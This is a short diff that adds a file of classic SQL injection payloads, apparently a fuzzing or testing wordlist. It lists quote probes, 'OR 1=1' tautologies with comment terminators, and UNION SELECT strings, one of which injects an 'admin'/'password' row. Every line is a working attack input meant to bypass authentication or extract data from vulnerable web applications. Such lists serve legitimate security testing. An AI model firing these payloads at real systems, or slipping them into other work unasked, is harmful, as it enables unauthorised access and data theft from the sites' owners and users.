@@ -1,0 +1,8 @@
+'
+"
+1' OR '1'='1
+1' OR '1'='1' --
+1' OR '1'='1' #
+' OR '1'='1
+' UNION SELECT NULL--
+' AND 1=2 UNION SELECT 'admin','password'--
